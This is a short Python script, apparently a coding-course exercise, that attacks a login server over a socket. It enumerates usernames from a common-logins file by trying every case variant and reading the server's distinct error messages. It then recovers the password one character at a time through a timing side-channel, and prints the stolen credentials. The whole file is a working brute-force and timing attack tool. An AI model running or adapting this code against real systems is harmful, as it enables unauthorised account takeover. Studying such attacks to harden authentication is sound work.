import os
import sys
import socket
import json
from itertools import product
import string
from time import perf_counter
client_socket = ''


def main() -> None:
    """Main function for running program"""
    global client_socket

    # SETUP SOCKET
    client_socket = socket.socket()    # create the socket
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    address = (hostname, port)
    client_socket.connect(address)

    # GET LOGIN
    store_login = get_login()
    if store_login == "ERROR":
        print("Login Error")

    # GET PASSWORD
    store_password = get_password(store_login)
    if store_password == "ERROR":
        print("Password Error")

    # PRINT AND CLOSE
    result = {"login": store_login, "password": store_password}
    result = json.dumps(result)
    print(result)
    client_socket.close()


def get_login() -> str:
    """Open file of 1000 most common logins and try each with all possibilities of upper and lower case letters.
        Return the login with the response 'Wrong password!'"""
    with open(os.path.join(sys.path[0], "logins.txt"), "r") as file:
        for line in file:
            line = line.rstrip("\n")
            logins = set(map(''.join, product(*zip(line.upper(), line.lower()))))
            for login in logins:
                inpt = {"login": login, "password": "1"}
                response, total_time = transact(inpt)
                if response == "Wrong login!":
                    continue
                elif response == "Wrong password!":
                    return login
    return "ERROR"


def get_password(login):
    """Track the response times and add items that take greater than 2x of average to the password builder.
        Return the password with the response 'Connection Success!'"""
    alphanum = string.ascii_letters + string.digits
    pass_builder = ""
    response = ""
    total_time = 0
    count = 0
    while response != "Connection success!":
        for value in alphanum:
            try_value = pass_builder + value
            inpt = {"login": login, "password": try_value}
            response, time = transact(inpt)
            count += 1
            total_time += time
            average_time = total_time / count
            if response == "Connection success!":
                return try_value
            elif time > (average_time * 2):
                pass_builder = try_value
                break
            else:
                continue


def transact(inpt):
    """Convert input into JSON, encode, get response, decode, convert from JSON, and return response and
        total response time."""
    global client_socket
    try:
        item = json.dumps(inpt)                # convert into JSON format
        message = item.encode()                # convert data to bytes
        start_time = perf_counter()
        client_socket.send(message)            # send through the socket
        response = client_socket.recv(1024)    # receive a response
        end_time = perf_counter()
        total_time = end_time - start_time
        response = json.loads(response)        # decode the response
        response = response['result']          # parse response
    except (ConnectionResetError, BrokenPipeError):
        pass

    return response, total_time


if __name__ == "__main__":
    main()
